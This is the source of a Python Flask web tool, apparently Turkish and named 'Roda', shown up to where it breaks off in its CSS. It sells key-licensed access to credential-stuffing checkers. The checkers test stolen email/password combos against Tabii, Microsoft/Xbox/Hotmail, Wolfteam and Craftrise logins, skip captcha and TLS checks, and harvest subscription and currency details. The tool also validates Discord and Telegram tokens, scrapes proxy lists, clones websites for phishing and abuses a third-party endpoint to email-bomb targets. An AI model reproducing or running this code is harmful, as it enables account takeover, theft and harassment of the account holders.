#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Roda - TÜM CHECKER'LAR TEK YERDE (Web)
Admin/Üye ayrımı | 1 Key 1 IP | Loglar | Webhook | Kar Taneleri
"""

import os, json, re, time, random, string, threading, webbrowser, base64, concurrent.futures
from datetime import datetime, timedelta
from urllib.parse import urljoin, urlparse, parse_qs, quote
import requests
from flask import Flask, request, jsonify, Response
from bs4 import BeautifulSoup
from user_agent import generate_user_agent

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ============================================================
# MASTER KEY (ENV'DEN AL, KODDA YOK)
# ============================================================
MASTER_KEY = os.environ.get("RODA_MASTER_KEY", "Roda@2026#Secure!X7")
if MASTER_KEY == "Roda@2026#Secure!X7":
    print("⚠️ UYARI: Varsayılan master key kullanılıyor! RODA_MASTER_KEY ortam değişkenini ayarlayın.")

KEYS_FILE = "keys.json"

# ============================================================
# LOG SİSTEMİ
# ============================================================
LOGS = []
MAX_LOGS = 1000

def add_log(message, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    LOGS.append({"timestamp": timestamp, "level": level, "message": message})
    if len(LOGS) > MAX_LOGS:
        LOGS.pop(0)
    print(f"[{timestamp}] [{level}] {message}")

# ============================================================
# KEY FONKSİYONLARI (1 KEY 1 IP + TEK KULLANIM)
# ============================================================
def load_keys():
    if os.path.exists(KEYS_FILE):
        with open(KEYS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_keys(data):
    with open(KEYS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

def is_key_valid(key):
    if key == MASTER_KEY:
        return True, "Admin", None
    keys = load_keys()
    if key not in keys:
        return False, None, None
    entry = keys[key]
    client_ip = get_client_ip()
    exp = entry.get("expires")
    if exp:
        if datetime.now() >= datetime.fromisoformat(exp):
            del keys[key]
            save_keys(keys)
            add_log(f"Key süresi doldu: {key}", "WARNING")
            return False, None, None
    bound_ip = entry.get("bound_ip")
    if bound_ip and bound_ip != client_ip:
        add_log(f"IP eşleşmedi! Key: {key}, Beklenen: {bound_ip}, Gelen: {client_ip}", "WARNING")
        return False, None, None
    if entry.get("used", False):
        add_log(f"Key zaten kullanılmış: {key}", "WARNING")
        return False, None, None
    return True, entry.get("note", "Kullanıcı"), entry

def mark_key_used(key):
    keys = load_keys()
    if key in keys:
        keys[key]["used"] = True
        keys[key]["used_at"] = datetime.now().isoformat()
        save_keys(keys)

def is_admin(key):
    valid, role, _ = is_key_valid(key)
    return valid and role == "Admin"

# ============================================================
# PLATFORMLAR (TÜM CHECKER'LAR)
# ============================================================
PLATFORMS = [
    {"name": "Tabii", "domain": "tabii.com", "icon": "fa-solid fa-tv"},
    {"name": "Xbox & MC", "domain": "xbox.com", "icon": "fa-brands fa-xbox"},
    {"name": "Wolfteam", "domain": "joygame.com", "icon": "fa-solid fa-skull"},
    {"name": "Craftrise", "domain": "craftrise.com.tr", "icon": "fa-solid fa-hammer"},
    {"name": "Hotmail", "domain": "outlook.com", "icon": "fa-solid fa-envelope"},
    {"name": "Token Check", "domain": "discord.com", "icon": "fa-solid fa-key"},
    {"name": "TikTok Gen", "domain": "tiktok.com", "icon": "fa-brands fa-tiktok"},
]

# ============================================================
# CHECKER FONKSİYONLARI
# ============================================================

# ---- TABII ----
TABII_BASE = "https://eu1.tabii.com/apigateway"

def check_tabii(email, password, proxy=None):
    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.tabii.com",
        "Referer": "https://www.tabii.com/"
    })
    if proxies:
        session.proxies.update(proxies)
    session.verify = False
    result = {"status": "ERROR", "details": {"full_name": "?", "subscription": "?", "premium": False, "expire": "?", "profiles_count": 0}, "message": ""}
    try:
        r = session.post(f"{TABII_BASE}/auth/v2/login", json={"email": email, "password": password}, timeout=15)
        if r.status_code != 200:
            result["status"] = "BAD"
            result["message"] = f"HTTP {r.status_code}"
            return result
        data = r.json()
        token = data.get("accessToken")
        if not token:
            result["status"] = "BAD"
            result["message"] = "Token missing"
            return result
        headers = {"Authorization": f"Bearer {token}"}
        r = session.get(f"{TABII_BASE}/auth/v2/me", headers=headers, timeout=10)
        if r.status_code != 200:
            result["status"] = "HIT"
            result["message"] = "Giriş başarılı (detaylar alınamadı)"
            return result
        user = r.json()
        name = user.get("name", "Unknown")
        surname = user.get("surname", "")
        full_name = f"{name} {surname}".strip()
        sub = user.get("subscription", {})
        subscription = sub.get("title", sub.get("name", "Free"))
        premium = subscription.lower() == "premium"
        expire = sub.get("expireDate", "")[:10] if sub.get("expireDate") else "N/A"
        r = session.get(f"{TABII_BASE}/profiles/v2/", headers=headers, timeout=10)
        profiles_count = 0
        if r.status_code == 200:
            prof_data = r.json()
            if isinstance(prof_data, list):
                profiles_count = len(prof_data)
        result["status"] = "HIT"
        result["message"] = "Giriş başarılı"
        result["details"]["full_name"] = full_name
        result["details"]["subscription"] = subscription
        result["details"]["premium"] = premium
        result["details"]["expire"] = expire
        result["details"]["profiles_count"] = profiles_count
        add_log(f"Tabii HIT: {email} | {full_name} | {subscription}", "SUCCESS")
    except Exception as e:
        result["status"] = "ERROR"
        result["message"] = str(e)[:60]
    finally:
        session.close()
    return result

# ---- XBOX ----
def check_xbox(email, password):
    session = requests.Session()
    session.verify = False
    try:
        sftag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
        resp = session.get(sftag_url, timeout=10)
        sftag_match = re.search(r'value=\\\"(.+?)\\\"', resp.text) or re.search(r'value="(.+?)"', resp.text)
        url_match = re.search(r'"urlPost":"(.+?)"', resp.text) or re.search(r"urlPost:'(.+?)'", resp.text)
        if not sftag_match or not url_match:
            return {"status": "CUSTOM", "message": "Token alınamadı"}
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag_match.group(1)}
        login_req = session.post(url_match.group(1), data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=10)
        if 'cancel?mkt=' in login_req.text or 'recover?mkt' in login_req.text:
            return {"status": "2FA", "message": "2FA gerekli"}
        if "incorrect" in login_req.text.lower() or "doesn't exist" in login_req.text.lower():
            return {"status": "BAD", "message": "Hatalı giriş"}
        if '#' in login_req.url:
            ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', ["None"])[0]
            if ms_token != "None":
                return {"status": "HIT", "message": "Xbox/MC giriş başarılı", "details": {"token": ms_token[:20] + "..."}}
        return {"status": "CUSTOM", "message": "Bağlı değil/Xbox yok"}
    except Exception as e:
        return {"status": "ERROR", "message": str(e)[:60]}

# ---- WOLFTEAM ----
def check_wolfteam(email, password):
    try:
        session = requests.Session()
        login_url = f"https://bservices.joygame.com/Hesap/JsonpLogin?callback=JG.ProccessLoginResponse&TopbarLoginUserName={quote(email)}&TopbarLoginPassword={quote(password)}&TopbarLoginRemember=true&FormId=tb-login-form&siteLang=tr"
        headers = {"User-Agent": generate_user_agent()}
        r = session.get(login_url, headers=headers, timeout=10)
        if '"IsSucceeded":true' in r.text:
            jp = re.search(r',"JpBalance":([^,}]+)', r.text)
            jp_val = jp.group(1).strip('"') if jp else "0"
            return {"status": "HIT", "message": f"JP: {jp_val}", "details": {"jp": jp_val}}
        elif '"IsSucceeded":false' in r.text:
            return {"status": "BAD", "message": "Hatalı giriş"}
        else:
            return {"status": "CUSTOM", "message": "Bilinmeyen hata"}
    except Exception as e:
        return {"status": "ERROR", "message": str(e)[:60]}

# ---- CRAFTRISE ----
def check_craftrise(email, password):
    try:
        session = requests.Session()
        login_url = "https://www.craftrise.com.tr/posts/post-login.php"
        headers = {"User-Agent": generate_user_agent(), "X-Requested-With": "XMLHttpRequest"}
        data = {"value": email, "password": password, "grecaptcharesponse": "dummy"}
        r = session.post(login_url, headers=headers, data=data, timeout=10)
        res = r.json()
        if res.get("resultType") == "success" or "başarıyla" in res.get("resultMessage", "").lower():
            rc_page = session.get("https://www.craftrise.com.tr/shop", headers=headers, timeout=5)
            soup = BeautifulSoup(rc_page.text, "html.parser")
            rc = soup.find('span', class_='rcCount')
            rc_val = rc.text.strip() if rc else "0"
            return {"status": "HIT", "message": f"RC: {rc_val}", "details": {"rc": rc_val}}
        else:
            return {"status": "BAD", "message": "Hatalı giriş"}
    except Exception as e:
        return {"status": "ERROR", "message": str(e)[:60]}

# ---- HOTMAIL ----
def check_hotmail(email, password):
    try:
        session = requests.Session()
        session.verify = False
        sftag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
        resp = session.get(sftag_url, timeout=10)
        sftag_match = re.search(r'value=\\\"(.+?)\\\"', resp.text) or re.search(r'value="(.+?)"', resp.text)
        url_match = re.search(r'"urlPost":"(.+?)"', resp.text) or re.search(r"urlPost:'(.+?)'", resp.text)
        if not sftag_match or not url_match:
            return {"status": "CUSTOM", "message": "Token alınamadı"}
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag_match.group(1)}
        login_req = session.post(url_match.group(1), data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=10)
        if 'cancel?mkt=' in login_req.text or 'recover?mkt' in login_req.text:
            return {"status": "2FA", "message": "2FA gerekli"}
        if "incorrect" in login_req.text.lower() or "doesn't exist" in login_req.text.lower():
            return {"status": "BAD", "message": "Hatalı giriş"}
        if '#access_token=' in login_req.url:
            return {"status": "HIT", "message": "Hotmail giriş başarılı"}
        return {"status": "CUSTOM", "message": "Bilinmeyen durum"}
    except Exception as e:
        return {"status": "ERROR", "message": str(e)[:60]}

# ---- TOKEN CHECK ----
def check_token(token_type, token):
    if token_type == "discord":
        headers = {"Authorization": token}
        is_bot = False
        try:
            res = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=5)
            if res.status_code != 200:
                headers = {"Authorization": f"Bot {token}"}
                res = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=5)
                is_bot = True
            if res.status_code == 200:
                data = res.json()
                user_type = "Bot" if is_bot else "User"
                username = f"{data.get('username')}#{data.get('discriminator', '0000')}"
                email = data.get('email', 'Yok')
                nitro = "Var" if data.get('premium_type', 0) > 0 else "Yok"
                mfa = "Aktif" if data.get('mfa_enabled') else "Pasif"
                return {"status": "HIT", "message": f"{user_type} | {username} | Nitro:{nitro} | 2FA:{mfa}", "details": {"email": email}}
            else:
                return {"status": "BAD", "message": "Geçersiz token"}
        except Exception as e:
            return {"status": "ERROR", "message": str(e)[:60]}
    elif token_type == "telegram":
        try:
            res = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=5)
            if res.status_code == 200 and res.json().get("ok"):
                data = res.json().get('result', {})
                return {"status": "HIT", "message": f"Bot: @{data.get('username')} (ID: {data.get('id')})"}
            else:
                return {"status": "BAD", "message": "Geçersiz token"}
        except Exception as e:
            return {"status": "ERROR", "message": str(e)[:60]}
    return {"status": "ERROR", "message": "Bilinmeyen token tipi"}

# ---- TIKTOK GEN ----
def check_tiktok(username):
    try:
        headers = {"User-Agent": generate_user_agent()}
        r = requests.head(f"https://www.tiktok.com/@{username}", headers=headers, timeout=5)
        if r.status_code == 404:
            return {"status": "HIT", "message": f"@{username} kullanılabilir"}
        elif r.status_code == 200:
            return {"status": "BAD", "message": f"@{username} alınmış"}
        else:
            return {"status": "CUSTOM", "message": f"Limit/Ban"}
    except:
        return {"status": "ERROR", "message": "Bağlantı hatası"}

# ---- TEMP MAIL ----
def generate_temp_mail():
    try:
        dom_res = requests.get("https://api.mail.tm/domains", timeout=10).json()
        domain = dom_res['hydra:member'][0]['domain']
        user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        email = f"{user}@{domain}"
        create_payload = {"address": email, "password": password}
        requests.post("https://api.mail.tm/accounts", json=create_payload, timeout=10)
        token_res = requests.post("https://api.mail.tm/token", json=create_payload, timeout=10).json()
        token = token_res['token']
        return {"success": True, "email": email, "password": password, "token": token}
    except Exception as e:
        return {"success": False, "error": str(e)}

def get_temp_mail_messages(token):
    try:
        headers = {"Authorization": f"Bearer {token}"}
        res = requests.get("https://api.mail.tm/messages", headers=headers, timeout=10)
        if res.status_code == 200:
            return {"success": True, "messages": res.json().get('hydra:member', [])}
        return {"success": False, "error": f"Sunucu Hatası: {res.status_code}"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def read_temp_mail(token, msg_id):
    try:
        headers = {"Authorization": f"Bearer {token}"}
        res = requests.get(f"https://api.mail.tm/messages/{msg_id}", headers=headers, timeout=10)
        if res.status_code == 200:
            return {"success": True, "message": res.json()}
        return {"success": False, "error": f"Mesaj Alınamadı: {res.status_code}"}
    except Exception as e:
        return {"success": False, "error": str(e)}

# ---- EMAIL SPAMMER ----
def send_spam(target_email):
    try:
        headers = {
            'authority': 'api.kidzapp.com',
            'accept': 'application/json',
            'content-type': 'application/json',
            'user-agent': generate_user_agent()
        }
        data = {'email': target_email, 'sdk': 'web', 'platform': 'desktop'}
        res = requests.post('https://api.kidzapp.com/api/3.0/customlogin/', headers=headers, json=data, timeout=5)
        if '"message":"EMAIL SENT"' in res.text:
            return {"success": True, "message": "Paket iletildi"}
        else:
            return {"success": False, "message": "Sunucu isteği reddetti"}
    except Exception as e:
        return {"success": False, "message": str(e)[:60]}

# ---- SİTE KOPYALA ----
def copy_site(url):
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9'
    }
    resp = requests.get(url, headers=headers, timeout=15)
    resp.raise_for_status()
    soup = BeautifulSoup(resp.text, 'html.parser')
    base_tag = soup.new_tag('base', href=url)
    if soup.head:
        soup.head.insert(0, base_tag)
    else:
        new_head = soup.new_tag('head')
        new_head.append(base_tag)
        soup.html.insert(0, new_head)
    return soup.prettify()

# ---- PROXY ----
def fetch_proxies():
    sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
    ]
    proxies = set()
    for url in sources:
        try:
            r = requests.get(url, timeout=15)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip()
                    if line and ':' in line and not line.startswith('#'):
                        proxies.add(line)
        except:
            pass
    return list(proxies)

# ============================================================
# FLASK ROTALARI
# ============================================================
@app.route("/")
def index():
    return HTML_TEMPLATE

@app.route("/api/login", methods=["POST"])
def login():
    data = request.json
    key = data.get("key", "").strip()
    client_ip = get_client_ip()
    valid, role, entry = is_key_valid(key)
    if valid:
        if entry and not entry.get("bound_ip"):
            keys = load_keys()
            keys[key]["bound_ip"] = client_ip
            save_keys(keys)
        mark_key_used(key)
        add_log(f"Giriş başarılı: {key[:4]}... (IP: {client_ip}, Rol: {role})", "SUCCESS")
        return jsonify({"success": True, "user": role, "isAdmin": role == "Admin"})
    else:
        add_log(f"Giriş başarısız: {key[:4]}... (IP: {client_ip})", "WARNING")
        return jsonify({"success": False, "error": "Geçersiz anahtar!"})

@app.route("/api/logs", methods=["GET"])
def get_logs():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    return jsonify({"logs": LOGS[-100:]})

# ---- CHECKER ROUTE'LARI ----
@app.route("/api/check", methods=["POST"])
def check():
    data = request.json
    platform = data.get("platform", "")
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    proxy = data.get("proxy", None)
    if not email or not password:
        return jsonify({"error": "Eksik"}), 400

    if platform == "Tabii":
        result = check_tabii(email, password, proxy)
    elif platform == "Xbox & MC":
        result = check_xbox(email, password)
    elif platform == "Wolfteam":
        result = check_wolfteam(email, password)
    elif platform == "Craftrise":
        result = check_craftrise(email, password)
    elif platform == "Hotmail":
        result = check_hotmail(email, password)
    elif platform == "Token Check":
        result = check_token("discord", email)  # email alanına token girilir
    elif platform == "TikTok Gen":
        result = check_tiktok(email)
    else:
        return jsonify({"error": "Geçersiz platform"}), 400
    return jsonify(result)

# ---- ADMIN ROUTE'LARI ----
@app.route("/api/admin/keys")
def admin_keys():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
    return jsonify(load_keys())

@app.route("/api/admin/generate", methods=["POST"])
def admin_generate():
    data = request.json
    key = data.get("master_key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
    note = data.get("note", "Oluşturuldu")
    hours = int(data.get("hours", 24))
    expires = datetime.now() + timedelta(hours=hours)
    new_key = "RODA-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
    keys = load_keys()
    keys[new_key] = {"note": note, "expires": expires.isoformat(), "created": datetime.now().isoformat(), "used": False, "bound_ip": None}
    save_keys(keys)
    add_log(f"Yeni key oluşturuldu: {new_key} - {note} ({hours} saat)", "SUCCESS")
    return jsonify({"success": True, "key": new_key, "expires": expires.strftime("%Y-%m-%d %H:%M:%S")})

@app.route("/api/admin/delete", methods=["POST"])
def admin_delete():
    data = request.json
    key = data.get("master_key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
    keys = load_keys()
    target = data.get("target_key", "")
    if target in keys:
        del keys[target]
        save_keys(keys)
        add_log(f"Key silindi: {target}", "INFO")
        return jsonify({"success": True})
    return jsonify({"success": False})

@app.route("/api/admin/webhook", methods=["POST"])
def admin_webhook():
    # Webhook gönderme (Discord)
    data = request.json
    key = data.get("master_key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
    url = data.get("webhook_url")
    content = data.get("content", "")
    if not url or not content:
        return jsonify({"success": False, "message": "Eksik parametre"}), 400
    try:
        r = requests.post(url, json={"content": content}, timeout=10)
        return jsonify({"success": r.status_code in [200, 204]})
    except:
        return jsonify({"success": False}), 500

@app.route("/api/fetch_proxies")
def fetch_proxies_route():
    try:
        proxies = fetch_proxies()
        add_log(f"{len(proxies)} proxy çekildi", "INFO")
        return jsonify({"success": True, "proxies": proxies, "count": len(proxies)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route("/api/sitecopy", methods=["POST"])
def sitecopy():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    data = request.json
    url = data.get("url", "").strip()
    if not url:
        return jsonify({"error": "URL gerekli"}), 400
    try:
        html = copy_site(url)
        add_log(f"Site kopyalandı: {url}", "SUCCESS")
        return Response(html, mimetype='text/html', headers={'Content-Disposition': 'attachment; filename="kopyalanan_site.html"'})
    except Exception as e:
        add_log(f"Site kopyalama hatası: {url} - {str(e)}", "ERROR")
        return jsonify({"error": str(e)}), 500

@app.route("/api/temp_mail_generate", methods=["POST"])
def temp_mail_generate():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    return jsonify(generate_temp_mail())

@app.route("/api/temp_mail_refresh", methods=["POST"])
def temp_mail_refresh():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    data = request.json
    token = data.get("token", "")
    if not token:
        return jsonify({"error": "Token gerekli"}), 400
    return jsonify(get_temp_mail_messages(token))

@app.route("/api/temp_mail_read", methods=["POST"])
def temp_mail_read():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    data = request.json
    token = data.get("token", "")
    msg_id = data.get("msg_id", "")
    if not token or not msg_id:
        return jsonify({"error": "Token ve msg_id gerekli"}), 400
    return jsonify(read_temp_mail(token, msg_id))

@app.route("/api/spam_send", methods=["POST"])
def spam_send():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    data = request.json
    email = data.get("email", "").strip()
    if not email:
        return jsonify({"error": "Email gerekli"}), 400
    return jsonify(send_spam(email))

# ============================================================
# HTML (KAR TANELİ + MENÜ)
# ============================================================
HTML_TEMPLATE = r"""
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Roda - Checker</title>
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Outfit,sans-serif}
body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
:root{--p:#3b82f6;--p2:#6366f1;--g:#10b981;--r:#ef4444;--card:#0f172a;--border:rgba(59,130,246,0.2);--bg:#0a0e1a;--sidebar:#020617;--text:#e8edf5;--muted:#94a3b8;--gold:#fbbf24}
/* KAR TANELERİ */
.snowflakes{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;overflow:hidden}
.snowflake{position:absolute;color:#fff;font-size:1.5em;top:-10%;animation:fall linear infinite;opacity:0.7}
@keyframes fall{0%{transform:translateY(0) rotate(0deg) scale(0.5);opacity:0.8}100%{transform:translateY(110vh) rotate(720deg) scale(1.2);opacity:0.2}}
#login-screen{position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;background:var(--bg);z-index:10}
#login-box{width:420px;padding:45px 40px;text-align:center;background:var(--card);border:1px solid var(--border);border-radius:28px;box-shadow:0 30px 60px rgba(0,0,0,0.5)}
#login-box .logo i{font-size:56px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
#login-box h1{font-size:28px;font-weight:900;letter-spacing:1px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
#login-box .sub{color:var(--muted);margin-bottom:25px;font-size:14px}
.inp{width:100%;padding:14px 18px;background:rgba(0,0,0,0.4);border:1px solid var(--border);color:#fff;border-radius:14px;font-size:15px;outline:none;transition:0.3s}
.inp:focus{border-color:var(--p);box-shadow:0 0 20px rgba(59,130,246,0.08)}
.btn{padding:15px;border:none;border-radius:14px;font-weight:700;cursor:pointer;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;width:100%;font-size:16px;transition:0.3s}
.btn:hover{transform:translateY(-2px);box-shadow:0 12px 24px rgba(59,130,246,0.25)}
.btn.sm{width:auto;padding:8px 16px;font-size:12px}
.btn.g{background:var(--g)}.btn.r{background:var(--r)}.btn.b{background:#1a73e8}
#sidebar{width:260px;min-width:260px;background:var(--sidebar);border-right:1px solid var(--border);display:flex;flex-direction:column;height:100vh;overflow-y:auto;position:relative;z-index:2}
.sidebar-header{padding:18px 20px;text-align:center;border-bottom:1px solid var(--border)}
.sidebar-header .logo-text{font-size:24px;font-weight:900;letter-spacing:2px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.sidebar-header .version{font-size:10px;color:var(--muted);letter-spacing:1px;margin-top:2px}
.sidebar-nav{flex:1;padding:12px 12px;overflow-y:auto}
.nav-divider{padding:8px 12px;font-size:10px;color:#475569;text-transform:uppercase;letter-spacing:1px;font-weight:700;margin-top:6px}
.nav-item{display:flex;align-items:center;gap:12px;padding:9px 14px;border-radius:8px;cursor:pointer;color:#94a3b8;font-weight:500;font-size:13px;transition:0.2s;margin-top:2px}
.nav-item:hover{background:rgba(59,130,246,0.06);color:#fff}
.nav-item.active{background:rgba(59,130,246,0.12);color:var(--p);border-left:3px solid var(--p)}
.nav-item i{font-size:16px;width:22px;text-align:center}
.nav-divider-admin{padding:8px 12px;font-size:10px;color:#475569;text-transform:uppercase;letter-spacing:1px;font-weight:700;margin-top:6px;border-top:1px solid var(--border)}
.sidebar-stats{padding:10px 14px;border-top:1px solid var(--border);display:flex;flex-wrap:wrap;gap:6px}
.mini-stat{flex:1;min-width:44%;background:var(--card);padding:6px 4px;border-radius:8px;text-align:center;border:1px solid rgba(255,255,255,0.03)}
.mini-stat .val{font-size:14px;font-weight:800;color:var(--text)}
.mini-stat .lbl{font-size:8px;color:var(--muted);text-transform:uppercase;letter-spacing:0.5px}
.mini-hit .val{color:var(--g)}.mini-2fa .val{color:var(--gold)}.mini-bad .val{color:var(--r)}.mini-check .val{color:var(--p)}
.sidebar-footer{padding:10px;text-align:center;font-size:9px;color:#334155;border-top:1px solid var(--border)}
#app{display:none;flex:1;flex-direction:column;height:100vh;position:relative;z-index:1}
.topbar{display:flex;align-items:center;gap:16px;padding:10px 20px;background:var(--card);border-bottom:1px solid var(--border)}
.topbar-title{font-size:15px;font-weight:700;color:var(--text)}
.topbar-title i{margin-right:8px;color:var(--p)}
.topbar-right{margin-left:auto;display:flex;align-items:center;gap:14px}
.pulse-dot{width:10px;height:10px;border-radius:50%;background:var(--g);animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}
.pulse-dot.idle{background:#475569;animation:none}
.main-content{flex:1;display:flex;overflow:hidden;background:var(--bg)}
.page{display:none;flex:1;flex-direction:column;padding:14px 18px;overflow-y:auto}
.page.active{display:flex}
.card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:14px 16px;margin-bottom:12px}
.card h3{font-size:14px;font-weight:700;margin-bottom:8px;color:var(--text)}
.card h3 i{color:var(--p);margin-right:6px}
.checker-platform-select{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px}
.checker-platform-select button{padding:6px 14px;background:rgba(59,130,246,0.08);border:1px solid rgba(59,130,246,0.15);border-radius:8px;color:#94a3b8;font-size:12px;cursor:pointer;transition:0.2s;display:flex;align-items:center;gap:4px}
.checker-platform-select button:hover{background:rgba(59,130,246,0.15);border-color:var(--p);color:#fff}
.checker-platform-select button.active{background:rgba(59,130,246,0.2);border-color:var(--p);color:var(--p)}
.checker-panel{display:none;background:var(--card);border:1px solid var(--border);border-radius:14px;padding:14px;margin-top:8px}
.checker-panel.active{display:block}
.checker-top{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-bottom:10px}
.checker-top textarea{flex:1;min-width:200px;height:60px;padding:8px 12px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:12px;outline:none;resize:vertical;font-family:monospace}
.checker-top textarea:focus{border-color:var(--p)}
.checker-top input[type=number]{width:70px;padding:8px;text-align:center;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:13px;outline:none}
.checker-top input[type=number]:focus{border-color:var(--p)}
.checker-top button{padding:6px 18px;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;border:none;border-radius:8px;font-weight:600;cursor:pointer;font-size:13px}
.checker-top button:disabled{opacity:0.5}
.checker-top button#checkerStopBtn{background:var(--r);display:none}
.checker-stats{display:flex;gap:16px;flex-wrap:wrap;margin:6px 0;font-size:12px}
.checker-stats span{color:var(--muted)}
.checker-stats .chk-count{font-weight:700;color:var(--text)}
.checker-results{max-height:250px;overflow-y:auto;border-radius:8px;background:rgba(0,0,0,0.2);border:1px solid var(--border)}
.checker-result-row{display:grid;grid-template-columns:1fr 100px 60px;gap:8px;padding:6px 12px;border-bottom:1px solid rgba(255,255,255,0.03);font-size:12px;align-items:center}
.checker-result-row .chk-status{font-weight:600}
.chk-hit{color:var(--g)}.chk-bad{color:var(--r)}.chk-2fa{color:var(--gold)}.chk-error{color:#f59e0b}
.hit-panel{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px}
.hit-panel .hit-box{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:12px}
.hit-panel .hit-box h4{font-size:13px;font-weight:700;margin-bottom:6px;display:flex;align-items:center;gap:6px}
.hit-panel .hit-box h4 i{font-size:14px}
.hit-panel .hit-box .hit-list{max-height:150px;overflow-y:auto;font-size:12px;color:var(--muted)}
.hit-panel .hit-box .hit-list .hit-item{padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.03);display:flex;justify-content:space-between}
.hit-panel .hit-box .hit-list .hit-item .hit-email{color:var(--text)}
.hit-panel .hit-box .hit-list .hit-item .hit-time{font-size:10px;color:var(--muted)}
.hit-filter{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:6px}
.hit-filter select{padding:4px 10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:6px;color:#fff;font-size:12px;outline:none}
.hit-filter select:focus{border-color:var(--p)}
.proxy-area{display:flex;gap:10px;flex-wrap:wrap;margin-top:6px}
.proxy-area textarea{flex:1;min-width:180px;height:50px;padding:6px 10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:11px;outline:none;resize:vertical;font-family:monospace}
.proxy-area textarea:focus{border-color:var(--p)}
.setting-row{display:flex;align-items:center;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border)}
.setting-row label{font-size:13px;font-weight:500}
